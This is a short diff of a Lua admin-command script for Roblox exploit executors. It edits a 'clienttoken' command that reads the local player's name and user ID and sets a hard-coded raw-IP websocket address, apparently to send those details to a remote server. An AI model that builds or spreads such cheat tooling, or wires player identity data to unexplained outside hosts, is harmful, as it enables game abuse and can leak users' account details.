@@ -6448,10 +6448,9 @@ local success, err =
     end
 end)
 
-addcmd('clienttoken', {'ctoken', 'iyrtoken'}, function(args, speaker)
+addcmd('clienttoken', {'ctoken'}, function(args, speaker)
 if _G.ws then return end
 
-local everywebsocket = WebSocket or websocket or (Krnl and Krnl.WebSocket) or (syn and syn.websocket)
 local url = "ws://3.70.136.27:6996/"
 local function generateRandomString(length)
 	local charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
@@ -6462,7 +6461,7 @@ local function generateRandomString(length)
 	end
 	return result
 end
-local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+
 local username = game.Players.LocalPlayer.Name
 local userId = game.Players.LocalPlayer.UserId
 local randomString = generateRandomString(8)
